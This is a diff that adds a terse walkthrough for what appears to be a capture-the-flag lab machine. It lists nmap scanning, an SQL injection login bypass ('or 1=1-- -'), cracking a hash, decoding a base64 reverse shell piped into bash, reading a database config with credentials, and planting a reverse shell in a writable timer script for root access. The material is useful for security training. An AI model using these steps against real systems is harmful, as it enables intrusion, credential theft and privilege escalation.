@@ -1,0 +1,11 @@
+1 - nmap -A 10.10.163.118
+2 - view-source:http://10.10.163.118/js/login.js -> python
+3 - Search -> 'or 1=1-- -
+4 - crackstation -> Minotaur
+5 - echo "bash reverse shell" | base64
+6 - B64_HASH | base64 -d | bash
+7 - cat /opt/lampp/htdocs/dbConnect.php
+8 - cat /home/user/flag.txt
+9 - ls /timer
+10 - echo "bash reverse shell" >> timer.sh
+11 - cat /root/root.txt
